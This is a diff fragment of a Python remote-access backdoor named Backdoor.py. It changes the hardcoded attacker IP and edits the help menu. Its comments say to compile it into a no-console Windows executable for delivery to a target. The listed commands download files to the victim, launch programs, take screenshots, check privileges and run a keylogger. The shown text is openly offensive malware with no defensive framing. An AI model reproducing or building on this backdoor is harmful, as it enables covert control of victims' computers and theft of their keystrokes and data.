@@ -9,7 +9,7 @@ import base64
 import threading
 import pynput.keyboard
 #[!!!!!!!!!!!!!!!] WARNING change it to your own ip host(attacker) and uncomment it
-host_ip = "192.168.2.3" 
+host_ip = "192.168.2.4" 
 #first before deliver make it exe or linux executable file :
 #Linux User Setup wine environment with python3 directory
 # target is windows then command : wine /root/.wine/drive_c/pyinstaller.exe --onefile --noconsole Backdoor.py 
@@ -107,10 +107,11 @@ def shell():
 			get url         -> Download File To Target From Any Website.
 			start path      -> Start Program on Target PC.
 			screenshot      -> Take A Screenshot of Targets Monior.
-			check           -> Check For Administrator Privileges .
+			check           -> Check For Administrator Privileges .(if target is windows)
+			whoami OR id	  -> Linux user check
 			q               -> exit frok backdoor.
-			keylog_start -> stat keylogger.
-			keylog_dump  -> stop keylogger.
+			keylog_start    -> start keylogger.
+			keylog_dump     -> stop keylogger.
 			'''
 		  reliable_send(help_options)
 
